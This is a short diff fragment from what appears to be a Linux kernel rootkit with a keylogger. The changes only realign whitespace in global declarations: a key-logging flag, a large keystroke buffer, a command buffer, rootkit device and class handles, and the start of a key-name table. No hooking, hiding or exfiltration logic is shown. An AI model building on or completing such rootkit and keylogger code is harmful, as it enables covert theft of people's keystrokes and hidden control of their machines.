@@ -30,20 +30,20 @@ MODULE_SUPPORTED_DEVICE("None");
 #define CLASS_NAME "root" 
 #define MAX_CMD_LENGTH 20
 
-int 			debug = 0;
-int 			keyLogOn = 1;
+int 		debug = 0;
+int 		keyLogOn = 1;
 static int 	shiftPressed = 0;
 static int	majorNumber;
 
-char 			keyBuffer[1000000];
-char 			commands[MAX_CMD_LENGTH];
+char 		keyBuffer[1000000];
+char 		commands[MAX_CMD_LENGTH];
 char* 		basePtr = keyBuffer;
 const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));
 
 struct semaphore s;
 struct task_struct *task;
 
-static struct class*		rootkitClass  = NULL;
+static struct class*	rootkitClass  = NULL;
 static struct device*	rootkitDevice = NULL;
 
 static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
